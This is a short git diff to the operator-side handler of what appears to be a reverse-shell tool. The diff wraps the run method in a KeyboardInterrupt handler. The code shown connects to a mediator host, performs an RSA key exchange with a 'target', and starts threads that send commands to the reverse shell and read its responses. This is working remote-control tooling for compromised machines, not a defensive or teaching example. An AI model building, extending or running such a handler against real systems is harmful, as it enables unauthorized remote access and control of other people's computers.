@@ -181,25 +181,28 @@ class Handler:
                 exit(1)
 
     def run(self):
-        # connect to server and perform key exchange with target
-        print(f"Using connection key: {self.connectionKey}")
-        print("The above key should be changing each time you run this program.\n")
-        self.connect(self.mediatorHost)
-        self.privKey, self.pubKey = self.getRSA()
-        self.cipherKey = self.keyExchange()
-        # start I/O threads to control the reverse shell
-        readSignal = threading.Event()
-        readSignal.set()
-        operatorToShell = threading.Thread(target=self.sendCommands, args=[readSignal])
-        operatorToShell.daemon = True
-        operatorToShell.start()
-        shellToOperator = threading.Thread(target=self.readResponses, args=[readSignal])
-        shellToOperator.daemon = True
-        shellToOperator.start()
-        # wait for threads to join
-        operatorToShell.join()
-        self.stopReceiving = True
-        shellToOperator.join()
+        try:
+            # connect to server and perform key exchange with target
+            print(f"Using connection key: {self.connectionKey}")
+            print("The above key should be changing each time you run this program.\n")
+            self.connect(self.mediatorHost)
+            self.privKey, self.pubKey = self.getRSA()
+            self.cipherKey = self.keyExchange()
+            # start I/O threads to control the reverse shell
+            readSignal = threading.Event()
+            readSignal.set()
+            operatorToShell = threading.Thread(target=self.sendCommands, args=[readSignal])
+            operatorToShell.daemon = True
+            operatorToShell.start()
+            shellToOperator = threading.Thread(target=self.readResponses, args=[readSignal])
+            shellToOperator.daemon = True
+            shellToOperator.start()
+            # wait for threads to join
+            operatorToShell.join()
+            self.stopReceiving = True
+            shellToOperator.join()
+        except KeyboardInterrupt:
+            print("\n^C")
         print("Closing connection...")
         self.shell.close()
 
